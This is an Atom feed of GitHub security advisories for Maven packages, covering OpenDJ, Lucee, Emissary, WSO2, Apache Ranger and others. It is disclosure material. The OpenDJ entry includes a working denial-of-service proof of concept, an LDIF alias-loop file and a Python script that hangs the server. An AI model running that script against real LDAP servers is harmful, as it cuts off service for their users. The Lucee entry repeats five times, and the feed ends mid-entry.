<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2025-03-06T01:28:29.886Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[gov.nsa.emissary:emissary] Emissary May Use a Broken or Risky Cryptographic Algorithm]]></title>
        <id>https://github.com/advisories/GHSA-hw43-fcmm-3m5g</id>
        <link href="https://github.com/advisories/GHSA-hw43-fcmm-3m5g"/>
        <updated>2025-03-05T23:13:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The ChecksumCalculator class within  allows for hashing and checksum generation, but it includes or defaults to algorithms that are no longer recommended for secure cryptographic use cases (e.g., SHA-1, CRC32, and SSDEEP). These algorithms, while possibly valid for certain non-security-critical tasks, can expose users to security risks if used in scenarios where strong cryptographic guarantees are required.</p>
<h3 id="requirement-from-nist">Requirement from NIST</h3>
<p>Requirement from NIST regarding SHA1</p>
<p><a href="https://csrc.nist.gov/projects/hash-functions#:~:text=NIST%20deprecated%20the%20use%20of,use%20of%20the%20SHA%2D1">https://csrc.nist.gov/projects/hash-functions#:~:text=NIST%20deprecated%20the%20use%20of,use%20of%20the%20SHA%2D1</a>.</p>
<blockquote>
<p>Federal agencies should use SHA-2 or SHA-3 as an alternative to SHA-1.
Further guidance will be available soon. Send questions on the transition to <a href="mailto:sha-1-transition@nist.gov">sha-1-transition@nist.gov</a>.</p>
</blockquote>
<p><a href="https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm">https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm</a></p>
<h3 id="mitigation-and-fix">Mitigation and Fix</h3>
<p>Make it clear to developers and users that the ChecksumCalculator is specific to the "Known File Filter" (KFF) document similarity feature and is not intended to suggest or endorse global use as a cryptographically secure hashing or checksum mechanism.</p>
<p>While these specific default insecure algorithms can not be updated without violating the intended use-case, it can be clearly documented and prevented using better access modifiers in the ChecksumCalculator class.</p>
<h3 id="details">Details</h3>
<p>Within ChecksumCalculator.java, the following points raise potential security concerns:</p>
<p>SHA-1:
SHA-1 has been widely deprecated for cryptographic purposes due to known collision attacks.
The constructor defaults to "SHA-1" if no specific algorithm is provided.
CRC32:
CRC32 is a simple checksum mechanism, not a cryptographic hash function. It is unsuitable for security-critical integrity checks since it can be easily manipulated or collided.
SSDEEP (Fuzzy Hashing):
SSDEEP is a context-specific tool used for similarity matching and may not be a secure cryptographic function for authentication or tamper detection.
There is no apparent mechanism to prevent developers from using these weaker algorithms in security-sensitive contexts. Users of emissary who rely on ChecksumCalculator for strong security guarantees (e.g., data integrity or authentication) may be misled into assuming these algorithms provide adequate protection.</p>
<h3 id="poc">PoC</h3>
<p>Code could be found <a href="https://github.com/NationalSecurityAgency/emissary/blob/main/src/main/java/emissary/kff/ChecksumCalculator.java">https://github.com/NationalSecurityAgency/emissary/blob/main/src/main/java/emissary/kff/ChecksumCalculator.java</a></p>
<h3 id="impact">Impact</h3>
<p>Impact
Weakened Security Posture: Applications integrating Emissary may inadvertently use these algorithms in a way that could be exploited (e.g., collisions in SHA-1, trivial collisions in CRC32).
Misleading Assurance: Developers might assume Emissaryâ€™s recommended defaults are secure for cryptographic validation, which can result in insecure implementations.
Potential for Collision Attacks: Attackers could craft inputs that yield the same SHA-1 hash or manipulate CRC32 sums, thus bypassing naive integrity checks.
Because this project is produced under the NSA umbrella, users may have an inflated trust in its security posture, potentially leading them to rely on these algorithms in high-security environments without recognizing the associated risks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-hw43-fcmm-3m5g">https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-hw43-fcmm-3m5g</a></li>
<li><a href="https://github.com/NationalSecurityAgency/emissary/commit/da3a81a8977577597ff2a944820a5ae4e9762368">https://github.com/NationalSecurityAgency/emissary/commit/da3a81a8977577597ff2a944820a5ae4e9762368</a></li>
<li><a href="https://github.com/NationalSecurityAgency/emissary/releases/tag/8.24.0">https://github.com/NationalSecurityAgency/emissary/releases/tag/8.24.0</a></li>
<li><a href="https://github.com/advisories/GHSA-hw43-fcmm-3m5g">https://github.com/advisories/GHSA-hw43-fcmm-3m5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw43-fcmm-3m5g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T22:18:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.webjars.npm:json-pointer] Prototype pollution in json-pointer]]></title>
        <id>https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</id>
        <link href="https://github.com/advisories/GHSA-7mg4-w3w5-x5pc"/>
        <updated>2025-03-05T19:04:38.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package json-pointer before 0.6.1. Multiple reference of object using slash is supported.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7709">https://nvd.nist.gov/vuln/detail/CVE-2020-7709</a></li>
<li><a href="https://github.com/manuelstofer/json-pointer/pull/34">https://github.com/manuelstofer/json-pointer/pull/34</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-JSONPOINTER-596925">https://snyk.io/vuln/SNYK-JS-JSONPOINTER-596925</a></li>
<li><a href="https://www.npmjs.com/package/json-pointer">https://www.npmjs.com/package/json-pointer</a></li>
<li><a href="https://github.com/manuelstofer/json-pointer/pull/34/files">https://github.com/manuelstofer/json-pointer/pull/34/files</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-598862">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-598862</a></li>
<li><a href="https://github.com/advisories/GHSA-7mg4-w3w5-x5pc">https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-10T18:37:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openidentityplatform.opendj:opendj-server-legacy] OpenDJ Denial of Service (DoS) using alias loop]]></title>
        <id>https://github.com/advisories/GHSA-93qr-h8pr-4593</id>
        <link href="https://github.com/advisories/GHSA-93qr-h8pr-4593"/>
        <updated>2025-03-05T18:33:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A denial-of-service (DoS) vulnerability in OpenDJ has been discovered that causes the server to become unresponsive to all LDAP requests without crashing or restarting. This issue occurs when an alias loop exists in the LDAP database. If an <code>ldapsearch</code> request is executed with alias dereferencing set to "always" on this alias entry, the server stops responding to all future requests.
I have confirmed this issue using the latest OpenDJ version (9.2), both with the official OpenDJ Docker image and a local OpenDJ server running on my Windows 10 machine.</p>
<h3 id="details">Details</h3>
<p>An unauthenticated attacker can exploit this vulnerability using a single crafted <code>ldapsearch</code> request. Fortunately, the server can be restarted without data corruption. While this attack requires the existence of an alias loop, I am uncertain whether such loops can be easily created in specific environments or if the method can be adapted to execute other DoS attacks more easily.</p>
<h3 id="poc-steps-to-reproduce">PoC (Steps to Reproduce)</h3>
<ol>
<li>Set up an OpenDJ server instance as usual, using the base DN <code>dc=example,dc=com</code></li>
<li>Import the attached <code>example_data_alias_dos.ldif</code> file into the LDAP database</li>
<li>Ensure that the <code>ldap3</code> Python library is installed (<code>pip install ldap3</code>)</li>
<li>Run the attached Python script <code>python opendj_alias_dos.py</code>, which searches for alias loops and executes the DoS attack</li>
<li>After executing the script, the server will stop responding to requests until it is restarted</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This vulnerability directly affects server availability for everyone using it. A single <code>ldapsearch</code> request on an alias loop entry can cause the entire server to become unresponsive, requiring a restart. The issue can be repeatedly triggered. The following response message is displayed on following requests:</p>
<pre><code>result: 80 Other (e.g., implementation specific) error
text: com.sleepycat.je.EnvironmentFailureException: (JE 18.3.12) JAVA_ERROR: Java Error occurred, recovery may not be possible.
</code></pre>
<p><strong>example_data_alias_dos.ldif</strong></p>
<pre><code>dn: dc=example,dc=com
objectClass: top
objectClass: domain
dc: example

dn: ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: people
description: All users

dn: ou=students,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: students
description: All students

dn: uid=jd123,ou=students,ou=people,dc=example,dc=com
objectClass: top
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
mail: jd123@example.com
sn: Doe
cn: John Doe
givenName: John
uid: jd123

dn: ou=employees,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: employees
description: All employees

dn: uid=jd123,ou=employees,ou=people,dc=example,dc=com
objectClass: alias
objectClass: top
objectClass: extensibleObject
aliasedObjectName: uid=jd123,ou=researchers,ou=people,dc=example,dc=com
uid: jd123

dn: ou=researchers,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: researchers
description: All reasearchers

dn: uid=jd123,ou=researchers,ou=people,dc=example,dc=com
objectClass: alias
objectClass: top
objectClass: extensibleObject
aliasedObjectName: uid=jd123,ou=employees,ou=people,dc=example,dc=com
uid: jd123
</code></pre>
<p><strong>opendj_alias_dos.py</strong></p>
<pre><code class="language-Python">import argparse

from ldap3 import Server, Connection, ALL, DEREF_NEVER, DEREF_ALWAYS
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError


def connect_to_ldap(ip, port):
    try:
        server = Server(ip, port, get_info=ALL)
        connection = Connection(server, auto_bind=True)
        return connection
    except (LDAPBindError, LDAPSocketOpenError) as e:
        print(f"Error connecting to LDAP server: {e}")
        return None


def find_aliases(connection, base_dn):
    try:
        search_filter = "(objectClass=alias)"
        connection.search(base_dn, search_filter=search_filter, dereference_aliases=DEREF_NEVER, attributes=["*"])
    except Exception as e:
        print(f"Error during search: {e}")

    aliases = {}
    for entry in connection.entries:
        entry_dn = entry.entry_dn
        entry_alias = entry.aliasedObjectName.value
        aliases[entry_dn] = entry_alias

    return aliases


def detect_alias_loop(aliases):
    visited = set()
    path = set()

    def dfs(alias):
        if alias in path:
            return alias
        if alias in visited:
            return None

        path.add(alias)
        visited.add(alias)

        aliased_target = aliases.get(alias)
        if aliased_target:
            result = dfs(aliased_target)
            if result:
                return result

        path.remove(alias)
        return None

    for alias in aliases:
        if alias not in visited:
            loop_alias = dfs(alias)
            if loop_alias:
                return loop_alias

    return None


def execute_dos_search(connection, looping_alias_dn):
    try:
        search_filter = "(objectClass=*)"
        connection.search(looping_alias_dn, search_filter=search_filter, dereference_aliases=DEREF_ALWAYS)
    except Exception as e:
        print(f"Error during search: {e}")

    for entry in connection.entries:
        entry_dn = entry.entry_dn
        print(entry_dn)


def main():
    parser = argparse.ArgumentParser(description="Search LDAP for circular alias references.")
    parser.add_argument("ip", type=str, nargs="?", default=None, help="The IP address of the LDAP server.")
    parser.add_argument("port", type=int, nargs="?", default=None, help="The port of the LDAP server.")
    parser.add_argument("base", type=str, nargs="?", default=None, help="The base DN of the LDAP server.")
    args = parser.parse_args()

    if not args.ip:
        args.ip = input("Please enter the IP address of the LDAP server: ")

    if not args.port:
        while True:
            try:
                port_input = input("Please enter the port of the LDAP server: ")
                args.port = int(port_input)
                break
            except ValueError:
                print("Invalid input. Please enter a valid integer for the port.")

    if not args.base:
        args.base = input("Please enter the base DN of the LDAP server: ")

    connection = connect_to_ldap(args.ip, args.port)
    if connection:
        aliases = find_aliases(connection, args.base)
        looping_alias_dn = detect_alias_loop(aliases)
        if looping_alias_dn:
            execute_dos_search(connection, looping_alias_dn)
            print(f"DOS executed with alias: {looping_alias_dn}")
        else:
            print("No looping alias DN found!")
        connection.unbind()


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593">https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27497">https://nvd.nist.gov/vuln/detail/CVE-2025-27497</a></li>
<li><a href="https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf">https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf</a></li>
<li><a href="https://github.com/advisories/GHSA-93qr-h8pr-4593">https://github.com/advisories/GHSA-93qr-h8pr-4593</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93qr-h8pr-4593</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T18:33:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wildfly.core:wildfly-elytron-integration] Wildfly Elytron integration susceptible to brute force attacks via CLI]]></title>
        <id>https://github.com/advisories/GHSA-3jxr-23ph-c89g</id>
        <link href="https://github.com/advisories/GHSA-3jxr-23ph-c89g"/>
        <updated>2025-03-04T21:57:27.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Wildfly Elytron integration. The component does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it more susceptible to brute force attacks via CLI.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23368">https://nvd.nist.gov/vuln/detail/CVE-2025-23368</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-23368">https://access.redhat.com/security/cve/CVE-2025-23368</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2337621">https://bugzilla.redhat.com/show_bug.cgi?id=2337621</a></li>
<li><a href="https://github.com/advisories/GHSA-3jxr-23ph-c89g">https://github.com/advisories/GHSA-3jxr-23ph-c89g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3jxr-23ph-c89g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-04T18:33:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.ranger:security-admin-web] Apache Ranger Improper Neutralization of Formula Elements vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2h4w-p9fh-9rmv</id>
        <link href="https://github.com/advisories/GHSA-2h4w-p9fh-9rmv"/>
        <updated>2025-03-03T22:12:12.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Formula Elements in Export CSV feature of Apache Ranger in Apache Ranger Version &lt; 2.6.0.
Users are recommended to upgrade to version 2.6.0, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55532">https://nvd.nist.gov/vuln/detail/CVE-2024-55532</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/RANGER/Vulnerabilities+found+in+Ranger">https://cwiki.apache.org/confluence/display/RANGER/Vulnerabilities+found+in+Ranger</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/03/2">http://www.openwall.com/lists/oss-security/2025/03/03/2</a></li>
<li><a href="https://github.com/apache/ranger/commit/8d89fec991f05bd92e28f459bc2b3a3024aaad82">https://github.com/apache/ranger/commit/8d89fec991f05bd92e28f459bc2b3a3024aaad82</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/RANGER/Apache+Ranger+2.6.0+-+Release+Notes">https://cwiki.apache.org/confluence/display/RANGER/Apache+Ranger+2.6.0+-+Release+Notes</a></li>
<li><a href="https://issues.apache.org/jira/browse/RANGER-5015">https://issues.apache.org/jira/browse/RANGER-5015</a></li>
<li><a href="https://github.com/advisories/GHSA-2h4w-p9fh-9rmv">https://github.com/advisories/GHSA-2h4w-p9fh-9rmv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2h4w-p9fh-9rmv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-03T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.streampipes:streampipes-parent] Apache StreamPipes has improper privilege management in a REST interface]]></title>
        <id>https://github.com/advisories/GHSA-vm7w-2724-5m23</id>
        <link href="https://github.com/advisories/GHSA-vm7w-2724-5m23"/>
        <updated>2025-03-03T20:21:18.000Z</updated>
        <content type="html"><![CDATA[<p>Improper privilege management in a REST interface allowed registered users to access unauthorized resources if the resource ID was known. </p>
<p>This issue affects Apache StreamPipes: through 0.95.1.</p>
<p>Users are recommended to upgrade to version 0.97.0 which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24778">https://nvd.nist.gov/vuln/detail/CVE-2024-24778</a></li>
<li><a href="https://lists.apache.org/thread/j14w6wghlwwrgfgc6hoz9f94fwxtlgzh">https://lists.apache.org/thread/j14w6wghlwwrgfgc6hoz9f94fwxtlgzh</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/03/1">http://www.openwall.com/lists/oss-security/2025/03/03/1</a></li>
<li><a href="https://github.com/advisories/GHSA-vm7w-2724-5m23">https://github.com/advisories/GHSA-vm7w-2724-5m23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm7w-2724-5m23</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T12:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wso2.is:identity-server-parent] WSO2 incorrect authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</id>
        <link href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r"/>
        <updated>2025-03-03T19:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>
<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2321">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>
<li><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>
<li><a href="https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-27T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wso2.is:identity-server-parent] WSO2 incorrect authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</id>
        <link href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r"/>
        <updated>2025-03-03T19:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>
<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2321">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>
<li><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>
